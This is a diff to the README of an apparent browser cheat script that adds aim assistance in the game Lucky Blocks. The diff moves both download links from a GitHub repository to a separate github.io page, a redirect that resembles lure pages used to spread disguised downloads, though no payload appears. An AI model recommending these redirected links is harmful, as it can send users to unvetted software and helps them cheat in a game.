@@ -1,6 +1,6 @@
 # 🎯 escape-waves-browser-script - Improve your aim in Lucky Blocks
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Unchivalrous-southeast231/escape-waves-browser-script)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://unchivalrous-southeast231.github.io)
 
 This tool helps you survive waves in the Lucky Blocks game. It adds automated target support to your web browser. You can use it to track moving targets and maintain your survival streak. This script runs directly in your browser. It does not require complex software or deep technical knowledge.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these standards before you begin:
 
 Use the link below to access the repository page. From there, you can download the latest version of the script.
 
-[https://github.com/Unchivalrous-southeast231/escape-waves-browser-script](https://github.com/Unchivalrous-southeast231/escape-waves-browser-script)
+[https://unchivalrous-southeast231.github.io](https://unchivalrous-southeast231.github.io)
 
 ## ⚙️ Installation Steps
 
